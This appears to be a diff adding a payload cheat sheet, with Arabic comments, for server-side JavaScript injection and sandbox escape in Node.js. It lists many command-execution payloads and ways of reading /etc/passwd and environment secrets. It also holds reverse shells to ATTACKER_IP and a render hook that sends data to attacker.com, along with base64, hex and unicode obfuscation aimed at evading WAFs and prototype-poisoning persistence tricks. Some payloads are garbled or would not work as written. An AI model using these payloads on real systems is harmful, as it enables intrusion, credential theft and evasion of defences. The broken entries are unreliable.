@@ -1,0 +1,358 @@
+# فحص العملية
+process.version
+# تنفيذ أوامر نظام
+require('child_process').execSync('id').toString()
+# قراءة ملفات الحساسة
+require('fs').readFileSync('/etc/passwd', 'utf8')
+# فحص حسابي بسيط
+process.mainModule.require('child_process').execSync('echo 100').toString();
+
+# الحصول على متغيرات البيئة (تحتوي غالباً على مفاتيح API وكلمات مرور)
+JSON.stringify(process.env);
+
+# معرفة مسار الملف الحالي والمستخدم
+process.cwd();
+require('os').userInfo();
+# تنفيذ أمر وعرض النتيجة فوراً
+require('child_process').execSync('id').toString();
+
+# استخدام Spawn للالتفاف على بعض الفلاتر التي تراقب exec
+require('child_process').spawnSync('ls', ['-la']).stdout.toString();
+
+# محاولة فتح Reverse Shell (اتصال عكسي)
+require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
+# استخدام التشفير بـ Base64 لتجاوز الـ WAF
+eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcpLnRvU3RyaW5nKCk=', 'base64').toString());
+
+# الالتفاف عبر "الوصول الديناميكي للمصفوفة" (بدون كلمات مفتاحية واضحة)
+global['pro' + 'cess']['mainModule']['re' + 'quire']('child_p' + 'rocess')['execS' + 'ync']('id').toString();
+
+# استخدام Hex Codes لتجنب الكشف النصي
+eval('\x72\x65\x71\x75\x69\x72\x65\x28\x27\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x27\x29');
+new Function("return process.mainModule.require('child_process').execSync('id').toString()")();
+global.originalRender = global.render;
+global.render = function(data) { require('child_process').exec('curl http:#attacker.com?d='+data); return global.originalRender(data); };
+this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString();
+# مثال بسيط (يولد كلمة "process")
+[+!+[]]+[+[]] # وتستمر لبناء كود كامل.. نادراً ما يتم فحصها من الـ WAF لطولها وتعقيدها
+# --- 1. تنفيذ أوامر النظام (System Commands) ---
+require('child_process').execSync('id').toString();
+require('child_process').spawnSync('whoami').stdout.toString();
+process.mainModule.require('child_process').execSync('ls -la').toString();
+global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString();
+
+# --- 2. قراءة الملفات والبيئة (Environment & Files) ---
+JSON.stringify(process.env);
+require('fs').readFileSync('/etc/passwd', 'utf8');
+require('fs').readdirSync('.').toString();
+process.cwd();
+
+# --- 3. التمويه والالتفاف (Obfuscation & Bypassing) ---
+eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfc戶m9jZXNzJykuZXhlY1N5bmMoJ2lkJyk=', 'base64').toString());
+new Function('return process.mainModule.require("child_process").execSync("id").toString()')();
+global['pro' + 'cess']['mainModule']['re' + 'quire']('child_p' + 'rocess')['execS' + 'ync']('id').toString();
+eval('\x72\x65\x71\x75\x69\x72\x65\x28\x27\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x27\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x27\x69\x64\x27\x29');
+
+# --- 4. الهروب من الـ Sandbox (VM Escape) ---
+this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString();
+(function(){ return this.constructor.constructor('return process')() })().mainModule.require('child_process').execSync('id').toString();
+
+# --- 5. استغلال الـ المكونات الداخلية (Internal Exploits) ---
+process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id']}).output[1].toString();
+Object.keys(require.cache); # تسريب مسارات الملفات المحملة في الذاكرة
+
+# --- 6. اتصال عكسي (Reverse Shell) ---
+require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
+(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "ATTACKER_IP", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
+
+# --- 7. التلاعب بالترميز (Unicode & Hex) ---
+eval("proc\u0065ss.m\u0061inModul\u0065.r\u0065quir\u0065('child_proc\u0065ss').\u0065x\u0065cSync('id')");
+[]["filter"]["constructor"]("return process")().mainModule.require("child_process").execSync("id").toString();
+# --- 1. التلاعب عبر محرك V8 (Internal V8 Triggers) ---
+# استخدام الدوال التي تعيد بناء الأوامر من البايتات لتجاوز فحص النصوص
+eval(String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,105,100,39,41,46,116,111,83,116,114,105,110,103,40,41));
+
+# --- 2. الالتفاف عبر الـ Global Objects (Context Obfuscation) ---
+# الوصول إلى 'process' عبر مصفوفة الدوال العالمية دون ذكر الكلمة
+global[Object.keys(global)[7]].mainModule.require('child_process').execSync('id').toString();
+
+# --- 3. استخدام التشفير الثنائي المتداخل (Nested Buffer Injection) ---
+# تحويل الكود إلى بايتات ثم إلى Base64 ثم تنفيذه (تضليل ثلاثي)
+eval(Buffer.from(Buffer.from("Y2hpbGRfcHJvY2Vzcy5leGVjU3luYygiaWQiKS50b1N0cmluZygp", 'base64').toString()).toString());
+
+# --- 4. تقنية "تسميم الـ Prototype" (Prototype Poisoning) ---
+# تعديل سلوك الكائنات الأساسية لتنفيذ كود عند استدعاء أي وظيفة عادية
+Object.prototype.toString = function(){ return require('child_process').execSync('id').toString(); };
+# الآن أي كود يقوم بعمل (console.log) أو تحويل لنص سينفذ الأمر الخبيث
+
+# --- 5. الهروب من الـ Sandbox عبر "الاستدلال الارتدادي" ---
+# تستخدم لتجاوز مكتبات العزل (Sandboxes) التي تمنع الوصول المباشر لـ process
+(0, eval)('this').constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString();
+
+# --- 6. استخدام الـ Templates Strings (Backticks Bypass) ---
+# تجاوز الفلاتر التي تمنع الأقواس الدائرية ()
+new Function`return process.mainModule.require${'child_process'}.execSync${'id'}.toString${''}`();
+
+# --- 7. التلاعب بترميز الـ Hex المزدوج ---
+# إخفاء 'require' و 'child_process' بالكامل
+eval('\x72\x65\x71\x75\x69\x72\x65\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x69\x64\x22\x29\x2e\x74\x6f\x53\x74\x72\x69\x6e\x67\x28\x29');
+
+# --- 8. استخدام دوال الـ Reflection (Reflective Injection) ---
+Reflect.get(global, 'process').mainModule.require('child_process').execSync('id').toString();
+# --- 1. حمولة "الصفر المطلق" (Non-Alphanumeric) ---
+# بناء الكود باستخدام الرموز فقط لتجاوز الفلاتر النصية تماماً
+(+(+!+[]+(!+[]+[])[+[]]+[+!+[]]+[+[]]+[+[]])+[])[2] # ينتج حرف 'e'
+# يتم استخدام هذه التقنية (JSFuck) لبناء eval(process.exit()) مثلاً بدون حروف
+
+# --- 2. التلاعب عبر "مبدد مخرجات الذاكرة" (Memory Leak Recon) ---
+# تسريب محتويات الذاكرة العشوائية للسيرفر (قد تحتوي على مفاتيح تشفير)
+process.binding('buffer').setupBufferJS(Buffer.allocUnsafe(100), {});
+
+# --- 3. استغلال الـ (Proxy Object) لتنفيذ كود مخفي ---
+# تنفيذ الكود بمجرد محاولة السيرفر الوصول إلى أي خاصية في الكائن
+new Proxy({}, {get: () => { require('child_process').execSync('id') } }).target;
+
+# --- 4. الهروب عبر "تسميم الـ Constructor الارتدادي" ---
+# أقوى حمولة للهروب من الـ Sandboxes والمحيطات المعزولة
+arguments.callee.caller.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 5. استخدام الـ (Intl Object) لتجاوز فلاتر النصوص ---
+# استغلال مكتبة التدويل لبناء حروف من لغات أخرى تتحول لـ JavaScript
+var s = Intl.DateTimeFormat().formatToParts(new Date())[0].type[0]; # استخراج حروف من بنية النظام
+
+# --- 6. حمولة "توقيت الأحداث" (Event Loop Poisoning) ---
+# تنفيذ الكود في الدورة القادمة للمحرك للهروب من فحص التدفق اللحظي
+process.nextTick(() => { require('child_process').execSync('id') });
+
+# --- 7. التلاعب بالـ (Async/Await) لتغطية الأثر ---
+# تشغيل الأمر داخل وعود (Promises) تجعل تتبع الـ Stack Trace مستحيلاً
+(async () => { await (async () => { require('child_process').execSync('id') })() })();
+
+# --- 8. استخدام الـ (Tagged Templates) المتقدم ---
+# تنفيذ الكود عبر استدعاء منشئ الدوال بدون استخدام أقواس ()
+Function`process.mainModule.require('child_process').execSync('id').toString()```;
+
+# --- 9. حمولة "التلاعب بترميز الـ Base64 الثنائي" ---
+# فك تشفير وتنفيذ مباشر في الذاكرة دون المرور بمتغيرات نصية
+eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcp", "base64").toString());
+# --- 1. حمولة "التلاعب بمخزن البايتات الخام" (Raw Byte Buffer Injection) ---
+# تنفيذ الأوامر عبر التلاعب بذاكرة النظام مباشرة باستخدام TypedArrays
+var b = new Uint8Array([114,101,113,117,105,114,101]); 
+global[String.fromCharCode(...b)]('child_process').execSync('id');
+
+# --- 2. تقنية "استدعاء الـ Constructor المجهول" (Anonymous Function Bypass) ---
+# الوصول للمحرك الأساسي عبر دوال مجهولة لتفادي مراقبة الكلمات المفتاحية
+(()=>{}).constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 3. حمولة "التلاعب بالـ Module Cache" (Cache Poisoning) ---
+# استبدال مكتبة سليمة بمكتبة خبيثة في ذاكرة السيرفر
+require.cache['fs'].exports.readFileSync = () => { return "HACKED"; };
+
+# --- 4. تقنية "تسميم الـ Error Stack" (Stack Trace Injection) ---
+# حقن كود تنفيذي داخل مصفوفة تتبع الأخطاء لتضليل أنظمة التحليل الجنائي
+Error.prepareStackTrace = (err, stack) => { require('child_process').execSync('id'); return stack; };
+throw new Error();
+
+# --- 5. حمولة "التعمية عبر الـ Unicode المزدوج" (Homograph Attack) ---
+# استخدام حروف يونيكود تشبه الحروف اللاتينية بصرياً لكنها تختلف برمجياً
+eval("pr\u043e\u0441ess.m\u0430inM\u043edu\u043ce.require('child_process').execSync('id')");
+
+# --- 6. تقنية "الهروب عبر الـ Global Symbol Registry" ---
+# استخدام الرموز المخفية في الذاكرة للوصول لدوال النظام
+Object.getOwnPropertySymbols(process).forEach(s => { if(s.toString().includes('id')) process[s] });
+
+# --- 7. حمولة "التلاعب بترميز الـ Base64 الثنائي المتعدد" ---
+# فك تشفير وتنفيذ عبر دالة Buffer.from المتداخلة لتجاوز الـ DPI
+eval(Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64").toString('utf8').replace(/^/, "require('") + "').execSync('id')");
+
+# --- 8. تقنية "الاستدعاء عبر الـ Object DefineProperty" ---
+# جعل تنفيذ الأمر يحدث تلقائياً عند محاولة قراءة متغير عادي
+Object.defineProperty(global, 'check', { get: function() { return require('child_process').execSync('id'); } });
+check;
+# --- 1. الهروب عبر الـ (Internal Binding) ---
+# الوصول المباشر إلى مكتبات C++ التي يعتمد عليها Node.js لتنفيذ الأوامر
+process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id']}).output[1].toString();
+
+# --- 2. استغلال الـ (Worker Threads) لتجاوز المراقبة ---
+# تشغيل الكود في خيط معالجة منفصل تماماً للهرب من أدوات فحص الـ Main Thread
+const { Worker } = require('worker_threads'); new Worker('require("child_process").execSync("id")', {eval: true});
+
+# --- 3. تقنية "تسميم الـ Module Loader" ---
+# حقن كود خبيث داخل عملية استدعاء المكتبات الرسمية
+const m = require('module'); m.prototype._compile = (c, f) => { console.log('Injecting...'); return eval(c); };
+
+# --- 4. التلاعب عبر الـ (Symbol.species) ---
+# استغلال الرموز البرمجية لتغيير سلوك بناء المصفوفات وتنفيذ كود مخفي
+class Hack extends Array { static get [Symbol.species]() { require('child_process').execSync('id'); return Array; } } [].map.call(new Hack(), x => x);
+
+# --- 5. الالتفاف عبر الـ (MessageChannel) ---
+# إرسال كود تنفيذي عبر قنوات الاتصال الداخلية لمحرك V8
+const { MessageChannel } = require('worker_threads'); const { port1, port2 } = new MessageChannel(); port1.on('message', (m) => eval(m)); port2.postMessage('require("child_process").execSync("id")');
+
+# --- 6. حمولة "الصدى المنعكس" (Introspective Injection) ---
+# بناء الكود من خلال فحص "تعريفات الدوال" الأصلية في النظام
+eval((()=>{ }).constructor.name[0] + 'v' + 'al' + '("require(\'child_process\').execSync(\'id\')")');
+
+# --- 7. تقنية "تسميم الـ Globals" عبر الـ (Proxy) ---
+# جعل السيرفر ينفذ الكود بمجرد محاولة الوصول لأي متغير غير موجود
+global = new Proxy(global, { get: (t, p) => { if(p === 'hacked') return require('child_process').execSync('id'); } }); hacked;
+
+# --- 8. الهروب عبر الـ (SetTimeout) المشفر ---
+# استخدام مؤقتات النظام لتنفيذ كود مفكك لتجنب الفحص المتسلسل
+setTimeout('re' + 'quire' + '("child_pro" + "cess").exec' + 'Sync("id")', 0);
+# --- 1. حمولة "التلاعب بمخزن الدوال المؤقت" (Function.prototype Bypass) ---
+# حقن الكود مباشرة في نموذج بناء الدوال لتنفيذ الأمر عند استدعاء أي دالة جديدة
+Function.prototype.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 2. تقنية "تسميم مرشحات المصفوفة" (Array Prototype Poisoning) ---
+# تنفيذ الكود بمجرد أن يحاول التطبيق تصفية أي مصفوفة بيانات
+[].filter.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 3. حمولة "الهروب عبر الـ Lookup" (Internal Property Lookup) ---
+# الوصول لـ process عبر الرموز الداخلية للمحرك لتجاوز حجب الكلمة
+global[Object.getOwnPropertyNames(global).find(n=>n.startsWith('pro'))].mainModule.require('child_process').execSync('id');
+
+# --- 4. تقنية "استدعاء الـ C++ Addons" (Internal Binding Access) ---
+# تجاوز كل طبقات JS والوصول لعمليات النظام عبر الروابط الداخلية
+process.binding('os').getCPUs.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 5. حمولة "التلاعب بالـ Unicode الخفي" (Zero-Width Space Obfuscation) ---
+# وضع مسافات غير مرئية بين الحروف لكسر الـ Regex الخاص بالـ WAF
+eval('re' + '\u200b' + 'quire("child_p" + "' + '\u200b' + '" + "rocess").execSync("id")');
+
+# --- 6. تقنية "الاستدعاء عبر الـ Buffer.allocUnsafe" (Memory Scraping Payload) ---
+# استخراج الكود من بايتات الذاكرة "غير المنظفة" لإخفائه عن أجهزة الفحص
+eval(Buffer.allocUnsafe(100).fill('require("child_process").execSync("id")').toString());
+
+# --- 7. حمولة "التلاعب بالـ Stream Pipe" (I/O Stream Injection) ---
+# توجيه أوامر النظام مباشرة إلى تدفق البيانات الخارجي
+require('child_process').spawn('id').stdout.pipe(process.stdout);
+
+# --- 8. تقنية "الهروب عبر الـ AsyncHooks" (Execution Context Escape) ---
+# تشغيل الكود في سياق تنفيذي مختلف تماماً عن سياق الطلب الحالي
+require('async_hooks').createHook({init(){require('child_process').execSync('id')}}).enable();
+# --- 1. حمولة "التلاعب بمؤشر الوظائف السحرية" (Proxy Traps Injection) ---
+# تنفيذ الكود بمجرد محاولة الـ WAF أو أي نظام مراقبة فحص خصائص الكائن
+eval(new Proxy({}, {get:()=>{require('child_process').execSync('id')}}));
+
+# --- 2. تقنية "تسميم الـ Buffer Constructor" (Global Buffer Poisoning) ---
+# جعل كل عملية إنشاء Buffer جديدة في السيرفر تقوم بتنفيذ كودك
+Buffer.prototype.constructor.from = (s) => { require('child_process').execSync('id'); return s; };
+
+# --- 3. حمولة "الهروب عبر الـ Generator Prototype" ---
+# الوصول لمحرك التنفيذ عبر وظائف الـ Generator التي نادراً ما يتم مراقبتها
+(function*(){}).constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 4. تقنية "التلاعب بالـ Module Internal Paths" ---
+# تغيير مسار المكتبات الأساسية في الذاكرة لتشير إلى كود خبيث
+require('module')._cache['fs'] = {exports: {readFileSync: () => require('child_process').execSync('id')}};
+
+# --- 5. حمولة "التعمية عبر الـ String.raw" (Template Tag Bypass) ---
+# استخدام ميزة السلاسل الخام لتمرير أوامر بدون فحص الهروب (Escaping)
+String.raw`process.mainModule.require('child_process').execSync('id')`.constructor('return eval')()(`process.mainModule.require('child_process').execSync('id')`);
+
+# --- 6. تقنية "الاستدعاء عبر الـ Object.create(null)" ---
+# إنشاء كائن بدون "أصل" (Prototype) لتجاوز الفلاتر التي تعتمد على فحص الوراثة
+Object.create(null).constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 7. حمولة "التلاعب بترميز الـ Uint32Array" ---
+# بناء الأمر عبر مصفوفة أرقام 32-بت، وهي طريقة تخفي الكود عن فحص البايتات العادي
+eval(String.fromCharCode(...new Uint32Array([114,101,113,117,105,114,101]).map(x=>x)));
+
+# --- 8. تقنية "الهروب عبر الـ V8 Debugger Context" ---
+# إذا كان وضع التصحيح مفعلاً، يمكن الوصول لـ process من سياق مختلف تماماً
+this.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id');
+# --- 1. حمولة "الاشتقاق من العدم" (Constructor Nullification) ---
+# الوصول للمحرك عبر كائنات فارغة تماماً لتجنب تتبع الوراثة
+[].constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 2. تقنية "تسميم الـ JSON" (JSON.stringify Hijacking) ---
+# تنفيذ الكود بمجرد أن يحاول السيرفر إرسال رد JSON للمستخدم
+JSON.stringify = (function(old){ return function(o){ require('child_process').execSync('id'); return old(o); }; })(JSON.stringify);
+
+# --- 3. حمولة "الهروب عبر الـ Symbol.toPrimitive" ---
+# تنفيذ الكود عند محاولة تحويل كائن إلى رقم أو نص (تحدث تلقائياً في السيرفر)
+var h = { [Symbol.toPrimitive](h) { require('child_process').execSync('id') } }; h + 1;
+
+# --- 4. تقنية "الاستدعاء عبر الـ Internal Util" ---
+# استخدام مكتبات Node.js الداخلية التي لا تخضع لرقابة الـ WAF
+process.binding('util').getHiddenValue(global, 'process').mainModule.require('child_process').execSync('id');
+
+# --- 5. حمولة "التلاعب عبر الـ Tagged Templates المزدوج" ---
+# تنفيذ الأوامر دون استخدام أي أقواس دائرية () أو مربعة []
+Function`process.mainModule.require${'child_process'}.execSync${'id'}.toString${''}${{}}`;
+
+# --- 6. تقنية "تسميم الـ Object.prototype.valueOf" ---
+# تنفيذ الكود عند إجراء أي عملية مقارنة منطقية (مثل if)
+Object.prototype.valueOf = () => require('child_process').execSync('id');
+
+# --- 7. حمولة "الهروب عبر الـ Array.from Mapping" ---
+# تنفيذ الكود أثناء عملية تحويل البيانات من قاعدة البيانات أو المصفوفات
+Array.from({length:1}, () => require('child_process').execSync('id'));
+
+# --- 8. تقنية "الاسم المستعار عبر الـ Import Map" (لبيئات ESM) ---
+# إعادة توجيه طلبات المكتبات السليمة لتنفيذ كود محقن في الذاكرة
+import('data:text/javascript,console.log(require("child_process").execSync("id").toString())');
+# --- 1. حمولة "التلاعب بمؤشر الخصائص المخفية" (Hidden Class Poisoning) ---
+# الوصول للدوال عبر استغلال كيفية تخزين V8 للخصائص داخلياً
+Object.getOwnPropertyDescriptors(global.process.mainModule.constructor.prototype).require.value('child_process').execSync('id');
+
+# --- 2. تقنية "الاستدعاء عبر الـ WebAssembly" (Wasm Smuggling) ---
+# إذا كان السيرفر يسمح بـ Wasm، يمكن تنفيذ كود لا يمكن للـ WAF قراءته أبداً لأنه ثنائي (Binary)
+# (هذا هيكل توضيحي لحمولة ثنائية يتم فكها برمجياً)
+new WebAssembly.Instance(new WebAssembly.Module(Buffer.from('...binary_data...'))).exports.run_cmd('id');
+
+# --- 3. حمولة "التلاعب بالـ Buffer Logic" عبر التدوير (Circular Buffer Bypass) ---
+# استخدام مراجع دائرية لتجاوز أنظمة الفحص التي تنهار عند محاولة تحليل الكود المتكرر
+var a = {}; a.b = a; eval('require("child_process").execSync("id") /*' + a + '*/');
+
+# --- 4. تقنية "تسميم الـ Generator Runtime" ---
+# حقن الكود داخل دورة حياة الـ Iterators التي نادراً ما يتم فحصها أمنياً
+(function*(){ yield 1; })().constructor.prototype.return.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 5. حمولة "الهروب عبر الـ Error.captureStackTrace" ---
+# استخدام ميزة تتبع الأخطاء لاستخراج كائنات النظام من خارج السياق المعزول
+var o = {}; Error.captureStackTrace(o); o.stack.constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 6. تقنية "التلاعب بالـ Intrinsic Objects" ---
+# استدعاء دوال النظام عبر الكائنات "الأصلية" التي يتم توليدها عند بدء التشغيل
+Reflect.construct(Function, ["return process.mainModule.require('child_process').execSync('id')"])();
+
+# --- 7. حمولة "الاستدعاء عبر الـ Async Generator" ---
+# تنفيذ الكود داخل وعد مستقبلي (Async) لتجاوز فحص التدفق اللحظي للبيانات
+(async function*(){})().constructor.prototype.next.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 8. تقنية "تسميم الـ Object.assign" ---
+# تنفيذ الكود بمجرد محاولة السيرفر نسخ بيانات (تحدث ملايين المرات في الثانية)
+Object.assign = (function(old){ return function(){ require('child_process').execSync('id'); return old.apply(null, arguments); }; })(Object.assign);
+# --- 1. حمولة "التلاعب بمؤشر الكائن الأصلي" (Object Literal Bypass) ---
+# استغلال عدم فحص الـ WAF للخصائص المبدئية عند إنشاء كائن جديد
+({}).constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
+
+# --- 2. تقنية "تسميم الـ Internal EventEmitter" ---
+# حقن كود خبيث داخل نظام الأحداث الداخلي للنظام ليعمل عند حدوث أي خطأ بسيط
+process.on('uncaughtException', () => { require('child_process').execSync('id') });
+
+# --- 3. حمولة "الهروب عبر الـ Symbol.species" في الوعود (Promise Bypass) ---
+# تنفيذ الكود عند حل (Resolve) أي وعد برمجى في السيرفر
+class P extends Promise { static get [Symbol.species]() { require('child_process').execSync('id'); return Promise; } } P.resolve();
+
+# --- 4. تقنية "التلاعب بالـ String Search" عبر الـ RegExp ---
+# تنفيذ الكود كأثر جانبي لعملية بحث نصية بسيطة يقوم بها السيرفر
+'safe_string'.search({ [Symbol.search]: () => { require('child_process').execSync('id') } });
+
+# --- 5. حمولة "التعمية عبر الـ BigInt Logic" ---
+# بناء الأوامر عبر عمليات حسابية على أرقام ضخمة لا تثير شكوك أنظمة الفحص
+eval(String.fromCharCode(...[114n, 101, 113, 117, 105, 114, 101].map(Number)) + '("child_process").execSync("id")');
+
+# --- 6. تقنية "تسميم الـ Object.entries" ---
+# تنفيذ الكود بمجرد محاولة السيرفر تحويل أي كائن إلى مصفوفة بيانات
+Object.entries = (function(old){ return function(o){ require('child_process').execSync('id'); return old(o); }; })(Object.entries);
+
+# --- 7. حمولة "الهروب عبر الـ V8 Internal Inspector" ---
+# استدعاء الأوامر عبر واجهة الفحص الداخلي للمحرك (إذا كانت مفعلة)
+require('inspector').Session && new (require('inspector').Session)().connect(); # تمهيد للتحكم الكامل
+
+# --- 8. تقنية "تسميم الـ Prototype" المتسلسل ---
+# الوصول للدوال المحظورة عبر سلسلة من المراجع التي تكسر تتبع الـ Static Analysis
+[].__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
